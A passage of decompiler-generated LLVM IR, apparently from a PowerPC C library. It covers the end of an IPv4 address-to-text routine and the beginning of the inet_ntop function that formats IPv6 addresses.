  %v0_10009fa0 = phi i32 [ %v1_1000a040, %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge ], [ 0, %dec_label_pc_10009f9c.lr.ph ]
  %v1_10009fa8 = phi i32 [ %v1_10009f9c.pre, %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge ], [ 0, %dec_label_pc_10009f9c.lr.ph ]
  %v0_10009f9c = load i32, i32* %r31.global-to-local, align 4
  %v2_10009f9c = add i32 %v0_10009f9c, %v1_10009fa8
  %v3_10009f9c = inttoptr i32 %v2_10009f9c to i8*
  %v4_10009f9c = load i8, i8* %v3_10009f9c, align 1
  %v5_10009f9c = zext i8 %v4_10009f9c to i32
  store i32 %v5_10009f9c, i32* %r10.global-to-local, align 4
  store i32 %v0_10009fa0, i32* %r8.global-to-local, align 4
  %v1_10009fa4 = add i32 %v0_10009fa0, 1
  store i32 %v1_10009fa4, i32* %r11.global-to-local, align 4
  store i32 %v2_10009f9c, i32* %r3.global-to-local, align 4
  %v1_10009fac = load i32, i32* @r28, align 4
  %v2_10009fac = udiv i32 %v5_10009f9c, %v1_10009fac
  %v2_10009fb0 = add i32 %v1_10009fa4, %v0_10009fb0
  store i32 %v2_10009fb0, i32* %r6.global-to-local, align 4
  %v1_10009fb4 = add nuw nsw i32 %v2_10009fac, 48
  %v1_10009fb8 = urem i32 %v1_10009fb4, 256
  store i32 %v1_10009fb8, i32* %r0.global-to-local, align 4
  %v1_10009fbc = trunc i32 %v1_10009fb4 to i8
  %v3_10009fbc = add i32 %v2_10009fbc, 8
  %v4_10009fbc = inttoptr i32 %v3_10009fbc to i8*
  store i8 %v1_10009fbc, i8* %v4_10009fbc, align 1
  %v0_10009fc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_10009fc0 = icmp eq i32 %v0_10009fc0, 48
  %v0_10009fc8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009fc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009fc8 = udiv i32 %v0_10009fc8, %v1_10009fc8
  store i32 %v2_10009fc8, i32* %r9.global-to-local, align 4
  br i1 %v3_10009fc0, label %dec_label_pc_10009fc8, label %dec_label_pc_10009ff4

dec_label_pc_10009fc8:                            ; preds = %dec_label_pc_10009f9c
  %v2_10009fcc = udiv i32 %v2_10009fc8, %v1_10009fc8
  %tmp18 = mul i32 %v2_10009fcc, -10
  %v2_10009fd4 = add i32 %v2_10009fc8, 48
  %v1_10009fd8 = add i32 %v2_10009fd4, %tmp18
  store i32 %v1_10009fd8, i32* %r9.global-to-local, align 4
  %v1_10009fdc = urem i32 %v1_10009fd8, 256
  store i32 %v1_10009fdc, i32* %r0.global-to-local, align 4
  %v1_10009fe0 = trunc i32 %v1_10009fd8 to i8
  %v2_10009fe0 = load i32, i32* %r7.global-to-local, align 4
  %v3_10009fe0 = add i32 %v2_10009fe0, 8
  %v4_10009fe0 = inttoptr i32 %v3_10009fe0 to i8*
  store i8 %v1_10009fe0, i8* %v4_10009fe0, align 1
  %v0_10009fe4 = load i32, i32* %r0.global-to-local, align 4
  %v3_10009fe4 = icmp eq i32 %v0_10009fe4, 48
  br i1 %v3_10009fe4, label %dec_label_pc_1000a010, label %dec_label_pc_10009fec

dec_label_pc_10009fec:                            ; preds = %dec_label_pc_10009fc8
  %v0_10009fec = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10009fec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a010

dec_label_pc_10009ff4:                            ; preds = %dec_label_pc_10009f9c
  %v0_10009ff8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009ff8 = add i32 %v0_10009ff8, 1
  store i32 %v1_10009ff8, i32* %r8.global-to-local, align 4
  %v2_10009ffc = udiv i32 %v2_10009fc8, %v1_10009fc8
  %v1_1000a000 = mul i32 %v2_10009ffc, 10
  store i32 %v1_1000a000, i32* %r0.global-to-local, align 4
  %v2_1000a004 = sub i32 %v2_10009fc8, %v1_1000a000
  %v1_1000a008 = add i32 %v2_1000a004, 48
  store i32 %v1_1000a008, i32* %r9.global-to-local, align 4
  %v1_1000a00c = trunc i32 %v1_1000a008 to i8
  %v2_1000a00c = load i32, i32* %r6.global-to-local, align 4
  %v3_1000a00c = add i32 %v2_1000a00c, 8
  %v4_1000a00c = inttoptr i32 %v3_1000a00c to i8*
  store i8 %v1_1000a00c, i8* %v4_1000a00c, align 1
  br label %dec_label_pc_1000a010

dec_label_pc_1000a010:                            ; preds = %dec_label_pc_10009fc8, %dec_label_pc_10009fec, %dec_label_pc_10009ff4
  %v0_1000a010 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a010 = inttoptr i32 %v0_1000a010 to i8*
  %v2_1000a010 = load i8, i8* %v1_1000a010, align 1
  %v3_1000a010 = zext i8 %v2_1000a010 to i32
  %v0_1000a014 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a014 = add i32 %v0_1000a014, 1
  %v0_1000a018 = load i32, i32* @r1, align 4
  %v2_1000a018 = add i32 %v0_1000a018, %v0_1000a014
  store i32 %v2_1000a018, i32* %r10.global-to-local, align 4
  %v2_1000a01c = add i32 %v1_1000a014, %v0_1000a018
  store i32 %v2_1000a01c, i32* %r8.global-to-local, align 4
  %v1_1000a020 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000a020 = udiv i32 %v3_1000a010, %v1_1000a020
  %v1_1000a024 = add i32 %v0_1000a014, 2
  store i32 %v1_1000a024, i32* %r11.global-to-local, align 4
  %v0_1000a028 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a028 = add i32 %v0_1000a028, 1
  store i32 %v1_1000a028, i32* %r4.global-to-local, align 4
  %v1_1000a02c = mul nuw nsw i32 %v2_1000a020, 10
  store i32 %v1_1000a02c, i32* %r0.global-to-local, align 4
  %v2_1000a030 = sub nsw i32 %v3_1000a010, %v1_1000a02c
  %v1_1000a034 = add nsw i32 %v2_1000a030, 48
  store i32 %v1_1000a034, i32* %r9.global-to-local, align 4
  %v1_1000a038 = trunc i32 %v1_1000a034 to i8
  %v3_1000a038 = add i32 %v2_1000a018, 8
  %v4_1000a038 = inttoptr i32 %v3_1000a038 to i8*
  store i8 %v1_1000a038, i8* %v4_1000a038, align 1
  %v0_1000a03c = load i32, i32* %r12.global-to-local, align 4
  %v1_1000a03c = trunc i32 %v0_1000a03c to i8
  %v2_1000a03c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000a03c = add i32 %v2_1000a03c, 8
  %v4_1000a03c = inttoptr i32 %v3_1000a03c to i8*
  store i8 %v1_1000a03c, i8* %v4_1000a03c, align 1
  %v0_1000a040 = load i32, i32* @r1, align 4
  %v1_1000a040 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a040 = add i32 %v1_1000a040, %v0_1000a040
  store i32 %v2_1000a040, i32* %r7.global-to-local, align 4
  %v0_1000a044 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a044 = add i32 %v0_1000a044, -1
  store i32 %v1_1000a044, i32* %ctr.global-to-local, align 4
  %v2_1000a044 = icmp eq i32 %v1_1000a044, 0
  br i1 %v2_1000a044, label %dec_label_pc_1000a048, label %dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge

dec_label_pc_1000a010.dec_label_pc_10009f9c_crit_edge: ; preds = %dec_label_pc_1000a010
  %v1_10009f9c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_1000a048:                            ; preds = %dec_label_pc_1000a010
  %v2_1000a048 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000a048, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a050 = add i32 %v1_1000a040, %v2_1000a048
  store i32 %v2_1000a050, i32* %r9.global-to-local, align 4
  store i32 %v2_1000a048, i32* @r3, align 4
  %v3_1000a058 = add i32 %v2_1000a050, -1
  %v4_1000a058 = inttoptr i32 %v3_1000a058 to i8*
  store i8 0, i8* %v4_1000a058, align 1
  %v0_1000a05c = call i32 @__GI_strlen()
  store i32 %v0_1000a05c, i32* %r3.global-to-local, align 4
  %v1_1000a060 = load i32, i32* @r30, align 4
  %v3_1000a060 = icmp ugt i32 %v0_1000a05c, %v1_1000a060
  br i1 %v3_1000a060, label %dec_label_pc_1000a068, label %dec_label_pc_1000a07c

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a048
  %v0_1000a068 = call i32 @__errno_location()
  store i32 %v0_1000a068, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000a074 = inttoptr i32 %v0_1000a068 to i32*
  store i32 28, i32* %v2_1000a074, align 4
  %v0_1000a090.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a08c

dec_label_pc_1000a07c:                            ; preds = %dec_label_pc_1000a048
  %v0_1000a07c = load i32, i32* @r29, align 4
  store i32 %v0_1000a07c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000a048, i32* %r4.global-to-local, align 4
  %v2_1000a084 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000a084 = call i32 @strcpy(i32 %v0_1000a07c, i8* %v2_1000a084)
  store i32 %v3_1000a084, i32* %r3.global-to-local, align 4
  store i32 %v3_1000a084, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a068, %dec_label_pc_1000a07c
  %v0_1000a090 = phi i32 [ %v0_1000a090.pre, %dec_label_pc_1000a068 ], [ %v3_1000a084, %dec_label_pc_1000a07c ]
  store i32 %v0_10009f44, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a090, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a090

; uselistorder directives
  uselistorder i32 %v0_1000a090, { 1, 0 }
  uselistorder i32 %v2_1000a048, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000a044, { 1, 0 }
  uselistorder i32 %v2_1000a040, { 1, 0 }
  uselistorder i32 %v0_1000a014, { 1, 0, 2 }
  uselistorder i32 %v1_10009fd8, { 1, 0, 2 }
  uselistorder i32 %v2_10009fc8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10009fb4, { 1, 0 }
  uselistorder i32 %v0_10009fa0, { 1, 0 }
  uselistorder i32 %v0_1000a0402, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 15, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32 268500992, { 14, 16, 17, 15, 0, 18, 19, 10, 11, 2, 12, 1, 13, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_1000a08c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a010, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000a0a4 = icmp slt i32 %arg1, 2
  %v3_1000a0a4 = icmp eq i32 %arg1, 2
  store i1 %v1_1000a0a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0a4, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000a0a4, label %dec_label_pc_1000a0d4, label %dec_label_pc_1000a0c8

dec_label_pc_1000a0c8:                            ; preds = %entry
  %v1_1000a0c8 = icmp slt i32 %arg1, 10
  %v3_1000a0c8 = icmp eq i32 %arg1, 10
  store i1 %v1_1000a0c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a0c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a0c8, label %dec_label_pc_1000a10c.lr.ph, label %dec_label_pc_1000a320

dec_label_pc_1000a0d4:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000a0e4.474 to i32), i32* @lr, align 4
  %v3_1000a0e0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000a318

dec_label_pc_1000a10c.lr.ph:                      ; preds = %dec_label_pc_1000a0c8
  %v2_1000a0e8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a0e8, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a0fc.475 to i32), i32* @lr, align 4
  %v3_1000a0f8 = call i32 @__GI_memset(i32 %v2_1000a0e8, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000a12c15 = load i32, i32* @r27, align 4
  store i32 %v0_1000a12c15, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a10c

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a10c.lr.ph, %dec_label_pc_1000a10c
  %v1_1000a120 = phi i32 [ 0, %dec_label_pc_1000a10c.lr.ph ], [ %v1_1000a130, %dec_label_pc_1000a10c ]
  %v0_1000a10c = phi i32 [ %v0_1000a12c15, %dec_label_pc_1000a10c.lr.ph ], [ %v0_1000a12c, %dec_label_pc_1000a10c ]
  %v0_1000a114 = phi i32 [ %v0_1000a12c15, %dec_label_pc_1000a10c.lr.ph ], [ %v2_1000a12c, %dec_label_pc_1000a10c ]
  %v1_1000a10c = phi i32 [ 0, %dec_label_pc_1000a10c.lr.ph ], [ %v0_1000a124, %dec_label_pc_1000a10c ]
  %v2_1000a10c = add i32 %v0_1000a10c, %v1_1000a10c
  %v3_1000a10c = inttoptr i32 %v2_1000a10c to i8*
  %v4_1000a10c = load i8, i8* %v3_1000a10c, align 1
  %v5_1000a10c = zext i8 %v4_1000a10c to i32
  %v1_1000a110 = add i32 %v1_1000a10c, 2
  store i32 %v1_1000a110, i32* %r11.global-to-local, align 4
  %v1_1000a114 = add i32 %v0_1000a114, 1
  %v2_1000a114 = inttoptr i32 %v1_1000a114 to i8*
  %v3_1000a114 = load i8, i8* %v2_1000a114, align 1
  %v4_1000a114 = zext i8 %v3_1000a114 to i32
  %v1_1000a118 = mul nuw nsw i32 %v5_1000a10c, 256
  %v2_1000a11c = or i32 %v4_1000a114, %v1_1000a118
  %v2_1000a120 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000a120 = add i32 %v2_1000a120, %v1_1000a120
  %v4_1000a120 = inttoptr i32 %v3_1000a120 to i32*
  store i32 %v2_1000a11c, i32* %v4_1000a120, align 4
  %v0_1000a124 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a124 = udiv i32 %v0_1000a124, 2
  %v0_1000a12c = load i32, i32* @r27, align 4
  %v2_1000a12c = add i32 %v0_1000a12c, %v0_1000a124
  store i32 %v2_1000a12c, i32* %r9.global-to-local, align 4
  %v1_1000a130 = mul i32 %v1_1000a124, 4
  %v0_1000a134 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a134 = add i32 %v0_1000a134, -1
  store i32 %v1_1000a134, i32* %ctr.global-to-local, align 4
  %v2_1000a134 = icmp eq i32 %v1_1000a134, 0
  br i1 %v2_1000a134, label %dec_label_pc_1000a154.lr.ph, label %dec_label_pc_1000a10c

dec_label_pc_1000a154.lr.ph:                      ; preds = %dec_label_pc_1000a10c
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a154

dec_label_pc_1000a154:                            ; preds = %dec_label_pc_1000a154.lr.ph, %dec_label_pc_1000a1a0
  %v0_1000a1a4 = phi i32 [ 8, %dec_label_pc_1000a154.lr.ph ], [ %v1_1000a1a4, %dec_label_pc_1000a1a0 ]
  %v0_1000a194 = phi i32 [ -1, %dec_label_pc_1000a154.lr.ph ], [ %v0_1000a19442, %dec_label_pc_1000a1a0 ]
  %v0_1000a184 = phi i32 [ -1, %dec_label_pc_1000a154.lr.ph ], [ %v0_1000a18439, %dec_label_pc_1000a1a0 ]
  %v0_1000a158 = phi i32 [ -1, %dec_label_pc_1000a154.lr.ph ], [ %v0_1000a15835, %dec_label_pc_1000a1a0 ]
  %v0_1000a1a0 = phi i32 [ 0, %dec_label_pc_1000a154.lr.ph ], [ %v1_1000a1a0, %dec_label_pc_1000a1a0 ]
  %v1_1000a154 = mul i32 %v0_1000a1a0, 4
  %v3_1000a158 = icmp eq i32 %v0_1000a158, -1
  %v2_1000a15c = add i32 %v1_1000a154, %v2_1000a0e8
  %v3_1000a15c = inttoptr i32 %v2_1000a15c to i32*
  %v4_1000a15c = load i32, i32* %v3_1000a15c, align 4
  %v3_1000a160 = icmp eq i32 %v4_1000a15c, 0
  br i1 %v3_1000a160, label %dec_label_pc_1000a168, label %dec_label_pc_1000a180

dec_label_pc_1000a168:                            ; preds = %dec_label_pc_1000a154
  br i1 %v3_1000a158, label %dec_label_pc_1000a16c, label %dec_label_pc_1000a178

dec_label_pc_1000a16c:                            ; preds = %dec_label_pc_1000a168
  store i32 %v0_1000a1a0, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000a1a0

dec_label_pc_1000a178:                            ; preds = %dec_label_pc_1000a168
  %v0_1000a178 = load i32, i32* @r31, align 4
  %v1_1000a178 = add i32 %v0_1000a178, 1
  store i32 %v1_1000a178, i32* @r31, align 4
  br label %dec_label_pc_1000a1a0

dec_label_pc_1000a180:                            ; preds = %dec_label_pc_1000a154
  br i1 %v3_1000a158, label %dec_label_pc_1000a1a0, label %dec_label_pc_1000a184

dec_label_pc_1000a184:                            ; preds = %dec_label_pc_1000a180
  %v3_1000a184 = icmp eq i32 %v0_1000a184, -1
  %v0_1000a198.pre = load i32, i32* @r31, align 4
  %v1_1000a18c = load i32, i32* @r30, align 4
  %v3_1000a18c = icmp sgt i32 %v0_1000a198.pre, %v1_1000a18c
  %or.cond = or i1 %v3_1000a184, %v3_1000a18c
  br i1 %or.cond, label %dec_label_pc_1000a194, label %dec_label_pc_1000a19c

dec_label_pc_1000a194:                            ; preds = %dec_label_pc_1000a184
  store i32 %v0_1000a194, i32* @r28, align 4
  store i32 %v0_1000a198.pre, i32* @r30, align 4
  br label %dec_label_pc_1000a19c

dec_label_pc_1000a19c:                            ; preds = %dec_label_pc_1000a184, %dec_label_pc_1000a194
  %v0_1000a18440 = phi i32 [ %v0_1000a194, %dec_label_pc_1000a194 ], [ %v0_1000a184, %dec_label_pc_1000a184 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a1a0

dec_label_pc_1000a1a0:                            ; preds = %dec_label_pc_1000a180, %dec_label_pc_1000a178, %dec_label_pc_1000a16c, %dec_label_pc_1000a19c
  %v0_1000a19442 = phi i32 [ %v0_1000a194, %dec_label_pc_1000a180 ], [ %v0_1000a194, %dec_label_pc_1000a178 ], [ %v0_1000a1a0, %dec_label_pc_1000a16c ], [ -1, %dec_label_pc_1000a19c ]
  %v0_1000a15835 = phi i32 [ -1, %dec_label_pc_1000a180 ], [ %v0_1000a158, %dec_label_pc_1000a178 ], [ %v0_1000a1a0, %dec_label_pc_1000a16c ], [ -1, %dec_label_pc_1000a19c ]
  %v0_1000a18439 = phi i32 [ %v0_1000a184, %dec_label_pc_1000a180 ], [ %v0_1000a184, %dec_label_pc_1000a178 ], [ %v0_1000a184, %dec_label_pc_1000a16c ], [ %v0_1000a18440, %dec_label_pc_1000a19c ]
  %v1_1000a1a0 = add nuw nsw i32 %v0_1000a1a0, 1
  store i32 %v1_1000a1a0, i32* %r11.global-to-local, align 4
  %v1_1000a1a4 = add nsw i32 %v0_1000a1a4, -1
  store i32 %v1_1000a1a4, i32* %ctr.global-to-local, align 4
  %v2_1000a1a4 = icmp eq i32 %v1_1000a1a4, 0
  br i1 %v2_1000a1a4, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a154

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a1a0
  %v3_1000a1a8 = icmp eq i32 %v0_1000a19442, -1
  %v1_1000a1c8 = icmp slt i32 %v0_1000a18439, -1
  %v3_1000a1c8 = icmp eq i32 %v0_1000a18439, -1
  store i1 %v1_1000a1c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a1a8, label %dec_label_pc_1000a1c8, label %dec_label_pc_1000a1b0

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a1a8
  %v0_1000a1c0.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000a1c8, label %dec_label_pc_1000a1c0, label %dec_label_pc_1000a1b8

dec_label_pc_1000a1b8:                            ; preds = %dec_label_pc_1000a1b0
  %v1_1000a1b8 = load i32, i32* @r30, align 4
  %v2_1000a1b8 = icmp slt i32 %v0_1000a1c0.pre, %v1_1000a1b8
  %v3_1000a1b8 = icmp sgt i32 %v0_1000a1c0.pre, %v1_1000a1b8
  %v4_1000a1b8 = icmp eq i32 %v0_1000a1c0.pre, %v1_1000a1b8
  store i1 %v2_1000a1b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a1b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a1b8, label %dec_label_pc_1000a1c0, label %dec_label_pc_1000a1c8.thread

dec_label_pc_1000a1c0:                            ; preds = %dec_label_pc_1000a1b0, %dec_label_pc_1000a1b8
  store i32 %v0_1000a1c0.pre, i32* @r30, align 4
  store i32 %v0_1000a19442, i32* @r28, align 4
  br label %dec_label_pc_1000a1c8.thread

dec_label_pc_1000a1c8.thread:                     ; preds = %dec_label_pc_1000a1c0, %dec_label_pc_1000a1b8
  %v0_1000a1d076 = phi i32 [ %v1_1000a1b8, %dec_label_pc_1000a1b8 ], [ %v0_1000a1c0.pre, %dec_label_pc_1000a1c0 ]
  %v0_1000a1c8.ph = phi i32 [ %v0_1000a18439, %dec_label_pc_1000a1b8 ], [ %v0_1000a19442, %dec_label_pc_1000a1c0 ]
  %v1_1000a1c859 = icmp slt i32 %v0_1000a1c8.ph, -1
  %v3_1000a1c861 = icmp eq i32 %v0_1000a1c8.ph, -1
  store i1 %v1_1000a1c859, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1c861, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a1d0

dec_label_pc_1000a1c8:                            ; preds = %dec_label_pc_1000a1a8
  br i1 %v3_1000a1c8, label %dec_label_pc_1000a1dc, label %dec_label_pc_1000a1c8.dec_label_pc_1000a1d0_crit_edge

dec_label_pc_1000a1c8.dec_label_pc_1000a1d0_crit_edge: ; preds = %dec_label_pc_1000a1c8
  %v0_1000a1d0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a1d0

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1c8.dec_label_pc_1000a1d0_crit_edge, %dec_label_pc_1000a1c8.thread
  %v0_1000a1d0 = phi i32 [ %v0_1000a1d076, %dec_label_pc_1000a1c8.thread ], [ %v0_1000a1d0.pre, %dec_label_pc_1000a1c8.dec_label_pc_1000a1d0_crit_edge ]
  %v0_1000a1c862 = phi i32 [ %v0_1000a1c8.ph, %dec_label_pc_1000a1c8.thread ], [ %v0_1000a18439, %dec_label_pc_1000a1c8.dec_label_pc_1000a1d0_crit_edge ]
  %v1_1000a1d0 = icmp slt i32 %v0_1000a1d0, 1
  %v2_1000a1d0 = icmp sgt i32 %v0_1000a1d0, 1
  %v3_1000a1d0 = icmp eq i32 %v0_1000a1d0, 1
  store i1 %v1_1000a1d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a1d0, label %dec_label_pc_1000a1dc, label %dec_label_pc_1000a1d8

dec_label_pc_1000a1d8:                            ; preds = %dec_label_pc_1000a1d0
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000a1dc

dec_label_pc_1000a1dc:                            ; preds = %dec_label_pc_1000a1d0, %dec_label_pc_1000a1c8, %dec_label_pc_1000a1d8
  %v0_1000a1e83 = phi i32 [ %v0_1000a1c862, %dec_label_pc_1000a1d0 ], [ -1, %dec_label_pc_1000a1c8 ], [ -1, %dec_label_pc_1000a1d8 ]
  %v2_1000a1dc = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000a1dc, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000a1e84 = icmp slt i32 %v0_1000a1e83, -1
  %v3_1000a1e86 = icmp eq i32 %v0_1000a1e83, -1
  store i1 %v1_1000a1e84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1e86, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a258 = icmp slt i32 %tmp, 65535
  %v4_1000a258 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000a1e8

dec_label_pc_1000a1e8:                            ; preds = %dec_label_pc_1000a1dc, %dec_label_pc_1000a2b4
  %v2_1000a224 = phi i32 [ %v2_1000a1dc, %dec_label_pc_1000a1dc ], [ %v2_1000a20c51, %dec_label_pc_1000a2b4 ]
  %v0_1000a1f8 = phi i32 [ %v0_1000a1e83, %dec_label_pc_1000a1dc ], [ %v0_1000a1e8, %dec_label_pc_1000a2b4 ]
  %v0_1000a218 = phi i32 [ 0, %dec_label_pc_1000a1dc ], [ %v1_1000a2b4, %dec_label_pc_1000a2b4 ]
  %v3_1000a1e87 = phi i1 [ %v3_1000a1e86, %dec_label_pc_1000a1dc ], [ %v3_1000a1e8, %dec_label_pc_1000a2b4 ]
  br i1 %v3_1000a1e87, label %dec_label_pc_1000a218, label %dec_label_pc_1000a1f0

dec_label_pc_1000a1f0:                            ; preds = %dec_label_pc_1000a1e8
  %v2_1000a1f0 = icmp slt i32 %v0_1000a218, %v0_1000a1f8
  %v4_1000a1f0 = icmp eq i32 %v0_1000a218, %v0_1000a1f8
  br i1 %v2_1000a1f0, label %dec_label_pc_1000a218, label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a1f0
  %v1_1000a1f8 = load i32, i32* @r30, align 4
  %v2_1000a1f8 = add i32 %v1_1000a1f8, %v0_1000a1f8
  %v2_1000a1fc = icmp slt i32 %v0_1000a218, %v2_1000a1f8
  %v4_1000a1fc = icmp eq i32 %v0_1000a218, %v2_1000a1f8
  store i1 %v2_1000a1fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a1fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a1fc, label %dec_label_pc_1000a204, label %dec_label_pc_1000a218

dec_label_pc_1000a204:                            ; preds = %dec_label_pc_1000a1f8
  br i1 %v4_1000a1f0, label %dec_label_pc_1000a208, label %dec_label_pc_1000a2b4

dec_label_pc_1000a208:                            ; preds = %dec_label_pc_1000a204
  %v3_1000a20c = inttoptr i32 %v2_1000a224 to i8*
  store i8 58, i8* %v3_1000a20c, align 1
  %v0_1000a210 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a210 = add i32 %v0_1000a210, 1
  store i32 %v1_1000a210, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a2b4

dec_label_pc_1000a218:                            ; preds = %dec_label_pc_1000a1f8, %dec_label_pc_1000a1f0, %dec_label_pc_1000a1e8
  %v1_1000a218 = icmp slt i32 %v0_1000a218, 0
  %v3_1000a218 = icmp eq i32 %v0_1000a218, 0
  store i1 %v1_1000a218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a218, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a218, label %dec_label_pc_1000a22c.thread, label %dec_label_pc_1000a22c

dec_label_pc_1000a22c.thread:                     ; preds = %dec_label_pc_1000a218
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a290

dec_label_pc_1000a22c:                            ; preds = %dec_label_pc_1000a218
  %v3_1000a224 = inttoptr i32 %v2_1000a224 to i8*
  store i8 58, i8* %v3_1000a224, align 1
  %v0_1000a228 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a228 = add i32 %v0_1000a228, 1
  store i32 %v1_1000a228, i32* %r29.global-to-local, align 4
  %v0_1000a22c.pre = load i32, i32* @r31, align 4
  %v1_1000a22c = icmp slt i32 %v0_1000a22c.pre, 6
  %v3_1000a22c = icmp eq i32 %v0_1000a22c.pre, 6
  store i1 %v1_1000a22c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a22c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a22c, label %dec_label_pc_1000a234, label %dec_label_pc_1000a290

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a22c
  %v0_1000a234 = load i32, i32* @r28, align 4
